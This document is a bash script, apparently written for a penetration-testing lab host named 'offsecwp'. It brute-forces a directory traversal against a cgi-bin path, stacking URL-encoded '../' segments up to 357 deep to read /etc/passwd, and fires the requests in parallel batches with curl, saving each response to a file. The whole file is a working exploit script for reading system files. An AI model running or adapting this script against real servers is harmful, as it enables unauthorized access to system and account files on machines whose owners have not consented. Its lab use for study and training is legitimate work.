#!/bin/bash

base_url="http://offsecwp/cgi-bin/"
encoded_dotdot="%2e%2e/"
endpoint="etc/passwd"

max_iterations=357
max_simultaneous=10

# Function to make a single request
make_request() {
    local iteration_count=$1
    local dotdot_string=""

    # Generating the appropriate number of "%2e%2e/" strings
    for ((i=1; i<=$iteration_count; i++))
    do
        dotdot_string+="$encoded_dotdot"
    done

    # Concatenating the URL
    local full_url="${base_url}${dotdot_string}${endpoint}"

    # Executing the cURL command and saving the output to a file
    local output_file="output_${iteration_count}.txt"
    echo "Executing cURL for iteration $iteration_count and saving output to $output_file:"
    curl "$full_url" > "$output_file"
}

# Counter for background processes
bg_counter=0

# Making max_iterations requests in groups of max_simultaneous
for ((iteration_count=1; iteration_count<=$max_iterations; iteration_count++))
do
    make_request $iteration_count &

    # Increment background counter
    ((bg_counter++))

    # If 5 processes are in the background, wait for them to complete before starting new ones
    if [ $bg_counter -eq $max_simultaneous ]; then
        wait
        bg_counter=0
    fi
done

# Wait for any remaining background processes to complete
wait

echo "All requests completed."
